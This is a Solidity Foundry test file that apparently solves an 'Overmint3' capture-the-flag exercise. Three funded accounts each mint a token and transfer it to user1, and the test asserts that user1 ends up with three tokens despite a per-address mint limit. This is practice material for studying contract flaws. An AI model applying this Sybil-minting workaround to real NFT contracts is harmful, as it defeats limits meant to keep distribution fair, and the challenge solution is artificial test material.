// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Overmint3} from "../src/Overmint3.sol";

contract TrusterTest is Test {
    Overmint3 public overmint;
    address user1 = vm.addr(1);
    address user2 = vm.addr(2);
    address user3 = vm.addr(3);
    address user4 = vm.addr(4);

    function setUp() public {
        vm.startPrank(user1);
        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
        vm.deal(user3, 100 ether);
        vm.deal(user4, 100 ether);

        overmint = new Overmint3();
    }

    function test_overmintExploitr() public {
        assertEq(overmint.totalSupply(), 0);
        assertEq(overmint.balanceOf(user1), 0);

        vm.startPrank(user2);
        overmint.mint();
        overmint.safeTransferFrom(user2, user1, overmint.totalSupply());

        vm.startPrank(user3);
        overmint.mint();
        overmint.safeTransferFrom(user3, user1, overmint.totalSupply());

        vm.startPrank(user4);
        overmint.mint();
        overmint.safeTransferFrom(user4, user1, overmint.totalSupply());
        

        assertEq(overmint.totalSupply(), 3);
        assertEq(overmint.balanceOf(user1), 3);
    }
}
